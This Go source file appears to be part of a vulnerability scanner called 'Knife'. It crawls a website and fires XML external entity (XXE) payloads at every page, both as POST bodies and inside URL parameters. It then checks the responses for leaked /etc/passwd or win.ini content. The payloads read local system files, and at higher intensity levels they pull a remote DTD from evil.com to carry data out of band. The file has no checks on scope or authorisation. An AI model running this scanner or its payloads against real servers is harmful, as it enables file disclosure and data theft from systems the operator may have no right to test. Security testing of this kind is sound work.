package vuln

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/PuerkitoBio/goquery"
)

// --- XXE Scanner Implementation ---

// FindingXXE describes a discovered potential XXE
type FindingXXE struct {
	Type            string `json:"type"`
	URL             string `json:"url"`
	Param           string `json:"param"`
	Payload         string `json:"payload"`
	ResponseSnippet string `json:"response_snippet"`
	Evidence        string `json:"evidence"`
	Timestamp       string `json:"timestamp"`
}

// XXEScanner holds the state for the XXE scan
type XXEScanner struct {
	StartURL    *url.URL
	Client      *http.Client
	Visited     map[string]bool
	VisitedMu   sync.RWMutex
	Queue       chan xxeCrawlJob
	Findings    []FindingXXE
	FindingsMu  sync.Mutex
	Workers     int
	Active      int32 // Added Active field
	MaxPages    int
	PageCount   int
	PageCountMu sync.Mutex
	MaxDepth    int
	Payloads    []string
	Intensity   int
	TargetedCVEs []string
	Throttle    time.Duration
}

// xxeCrawlJob represents a URL to be scanned
type xxeCrawlJob struct {
	URL   string
	Depth int
}

func NewXXEScanner(start string, workers, maxPages, maxDepth int, throttle time.Duration, intensity int, targetedCVEs []string, customPayloads []string) (*XXEScanner, error) {
	parsed, err := url.Parse(start)
	if err != nil {
		return nil, err
	}
	client := &http.Client{
		Timeout: 20 * time.Second,
	}

	payloads := generateXXEPayloads(intensity, targetedCVEs, customPayloads)

	s := &XXEScanner{
		StartURL:     parsed,
		Client:       client,
		Visited:      make(map[string]bool),
		Queue:        make(chan xxeCrawlJob, 1000),
		Findings:     []FindingXXE{},
		Workers:      workers,
		MaxPages:     maxPages,
		MaxDepth:     maxDepth,
		Throttle:     throttle,
		Payloads:     payloads,
		Intensity:    intensity,
		TargetedCVEs: targetedCVEs,
	}
	return s, nil
}

// Run starts the scanning process
func (s *XXEScanner) Run() {
	var wg sync.WaitGroup
	for i := 0; i < s.Workers; i++ {
		wg.Add(1)
		go s.worker(&wg)
	}

	s.enqueue(s.StartURL.String(), 0)

	for {
		time.Sleep(1 * time.Second)
		s.PageCountMu.Lock()
		done := s.PageCount >= s.MaxPages
		s.PageCountMu.Unlock()

		// Wait for queue to be empty AND no workers active
		if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
			if done {
				break
			}
			// Double check after a small delay to be sure
			time.Sleep(2 * time.Second)
			if len(s.Queue) == 0 && atomic.LoadInt32(&s.Active) == 0 {
				break
			}
		}
	}
	close(s.Queue)
	wg.Wait()
}

func (s *XXEScanner) worker(wg *sync.WaitGroup) {
	defer wg.Done()
	for job := range s.Queue {
		atomic.AddInt32(&s.Active, 1) // Increment active workers
		s.PageCountMu.Lock()
		if s.PageCount >= s.MaxPages {
			s.PageCountMu.Unlock()
			atomic.AddInt32(&s.Active, -1) // Decrement before returning
			return
		}
		s.PageCountMu.Unlock()

		if !s.markVisited(job.URL) {
			atomic.AddInt32(&s.Active, -1) // Decrement before continuing
			continue
		}

		log.Printf("[XXE Scan] Visiting %s (Depth: %d)\n", job.URL, job.Depth)

		s.fuzzURL(job.URL)

		if job.Depth < s.MaxDepth {
			s.crawl(job.URL, job.Depth)
		}
		atomic.AddInt32(&s.Active, -1) // Decrement active workers
	}
}

func (s *XXEScanner) crawl(u string, depth int) {
	resp, err := s.Client.Get(u)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	ct := resp.Header.Get("Content-Type")
	if !strings.Contains(strings.ToLower(ct), "text/html") {
		return
	}

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return
	}

	doc.Find("a[href]").Each(func(i int, sel *goquery.Selection) {
		href, exists := sel.Attr("href")
		if !exists {
			return
		}
		absoluteURL, err := s.normalize(u, href)
		if err == nil {
			s.enqueue(absoluteURL, depth+1)
		}
	})
}

func (s *XXEScanner) fuzzURL(rawURL string) {
	// XXE is typically POST, but we can try to inject into GET params too if they accept XML
	// But mostly we need to find endpoints that accept XML bodies.
	// For this scanner, we'll try to send POST requests with XML payloads to the URL
	// regardless of whether it looks like it accepts XML, just in case.
	// Also, we can try to inject into parameters if they are reflected into an XML structure.

	if s.Throttle > 0 {
		time.Sleep(s.Throttle)
	}

	// 1. Try POSTing raw XML
	for _, payload := range s.Payloads {
		req, err := http.NewRequest("POST", rawURL, strings.NewReader(payload))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/xml")
		req.Header.Set("User-Agent", "Knife-XXE-Scanner/1.0")

		resp, err := s.Client.Do(req)
		if err != nil {
			continue
		}

		bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
		resp.Body.Close()
		if err != nil {
			continue
		}
		bodyStr := string(bodyBytes)

		if evidence, found := s.detectXXE(bodyStr); found {
			s.addFinding(FindingXXE{
				Type:            "XXE (Raw POST)",
				URL:             rawURL,
				Param:           "BODY",
				Payload:         payload,
				ResponseSnippet: snippet(bodyStr, 200),
				Evidence:        evidence,
			})
		}
	}

	// 2. Try injecting into URL parameters (less common but possible)
	u, err := url.Parse(rawURL)
	if err != nil {
		return
	}
	query := u.Query()
	for param, values := range query {
		originalValue := values[0]
		for _, payload := range s.Payloads {
			newQuery := u.Query()
			newQuery.Set(param, payload)
			u.RawQuery = newQuery.Encode()
			testURL := u.String()

			req, err := http.NewRequest("GET", testURL, nil)
			if err != nil {
				continue
			}
			resp, err := s.Client.Do(req)
			if err != nil {
				continue
			}
			bodyBytes, err := io.ReadAll(io.LimitReader(resp.Body, 50000))
			resp.Body.Close()
			if err != nil {
				continue
			}
			bodyStr := string(bodyBytes)

			if evidence, found := s.detectXXE(bodyStr); found {
				s.addFinding(FindingXXE{
					Type:            "XXE (GET Param)",
					URL:             testURL,
					Param:           param,
					Payload:         payload,
					ResponseSnippet: snippet(bodyStr, 200),
					Evidence:        evidence,
				})
			}
		}
		_ = originalValue
	}
}

func (s *XXEScanner) detectXXE(body string) (string, bool) {
	signatures := []struct {
		Pattern *regexp.Regexp
		Name    string
	}{
		{regexp.MustCompile(`root:x:0:0`), "/etc/passwd content"},
		{regexp.MustCompile(`\[extensions\]`), "win.ini content"},
		{regexp.MustCompile(`\[boot loader\]`), "boot.ini content"},
		{regexp.MustCompile(`java\.io\.FileNotFoundException`), "Java File Not Found"},
	}

	for _, sig := range signatures {
		if sig.Pattern.MatchString(body) {
			match := sig.Pattern.FindString(body)
			return fmt.Sprintf("Matched signature: %s (%s)", sig.Name, match), true
		}
	}

	return "", false
}

func generateXXEPayloads(intensity int, targetedCVEs []string, customPayloads []string) []string {
	var payloads []string

	// CVE-specific payloads
	for _, id := range targetedCVEs {
		if cve, ok := GetCVEDatabase()[id]; ok && cve.Type == ScannerXXE {
			payloads = append(payloads, cve.Payloads...)
		}
	}

	base := []string{
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
		`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>`,
	}

	if intensity > 2 {
		base = append(base, []string{
			`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>`,
			`<?xml version="1.0"?><soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><foo><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root></foo></soap:Body></soap:Envelope>`,
		}...)
	}

	if intensity > 3 {
		base = append(base, []string{
			`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe.dtd">%remote;]><root></root>`,
			`<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://evil.com/out-of-band.dtd">%dtd;%all;]><data>&send;</data>`,
		}...)
	}

	payloads = append(payloads, base...)
	if len(customPayloads) > 0 {
		payloads = append(payloads, customPayloads...)
	}

	return payloads
}

func (s *XXEScanner) markVisited(u string) bool {
	s.VisitedMu.Lock()
	defer s.VisitedMu.Unlock()
	if s.Visited[u] {
		return false
	}
	s.Visited[u] = true
	s.PageCountMu.Lock()
	s.PageCount++
	s.PageCountMu.Unlock()
	return true
}

func (s *XXEScanner) enqueue(u string, depth int) {
	u = strings.Split(u, "#")[0]
	s.VisitedMu.RLock()
	if s.Visited[u] {
		s.VisitedMu.RUnlock()
		return
	}
	s.VisitedMu.RUnlock()

	select {
	case s.Queue <- xxeCrawlJob{URL: u, Depth: depth}:
	default:
	}
}

func (s *XXEScanner) addFinding(f FindingXXE) {
	s.FindingsMu.Lock()
	defer s.FindingsMu.Unlock()
	f.Timestamp = time.Now().Format(time.RFC3339)
	s.Findings = append(s.Findings, f)
	log.Printf("[!] XXE FOUND: %s (Param: %s)\n", f.URL, f.Param)
}

func (s *XXEScanner) normalize(base, href string) (string, error) {
	b, err := url.Parse(base)
	if err != nil {
		return "", err
	}
	h, err := url.Parse(href)
	if err != nil {
		return "", err
	}
	resolved := b.ResolveReference(h)
	return resolved.String(), nil
}
